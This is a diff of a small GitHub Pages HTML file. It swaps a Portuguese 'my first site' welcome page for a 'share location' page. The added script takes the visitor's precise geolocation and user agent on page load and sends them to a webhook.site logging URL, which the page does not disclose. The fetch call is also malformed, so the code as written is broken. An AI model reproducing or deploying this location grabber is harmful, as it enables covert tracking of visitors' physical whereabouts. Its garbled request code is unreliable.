@@ -1,22 +1,41 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Meu Primeiro Site</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background-color: #f0f8ff;
-      color: #333;
-      margin-top: 100px;
-    }
-    h1 { color: #0066cc; }
-  </style>
-</head>
-<body>
-  <h1>Bem-vindo ao meu primeiro site!</h1>
-  <p>Feito com 💙 e GitHub Pages.</p>
-</body>
-</html>
+<h2>Compartilhar Localização</h2>
+<p id="status">Aguardando permissão...</p>
+
+<script>
+const status = document.getElementById('status');
+
+function enviarLocalizacao(lat, lon) {
+  const dados = {
+    latitude: lat,
+    longitude: lon,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
+  };
+
+  fetch('', { 'https://webhook.site/c4a3b066-2515-4d6b-825f-f09ed7858c7f')
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(dados)
+  })
+  .then(() => status.textContent = 'Localização enviada com sucesso.')
+  .catch(err => status.textContent = 'Erro: ' + err);
+}
+
+if ('geolocation' in navigator) {
+  status.textContent = 'Solicitando localização...';
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      status.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+      enviarLocalizacao(lat, lon);
+    },
+    err => {
+      status.textContent = 'Erro ao obter localização: ' + err.message;
+    },
+    { enableHighAccuracy: true, timeout: 20000 }
+  );
+} else {
+  status.textContent = 'Seu navegador não suporta geolocalização.';
+}
+</script>
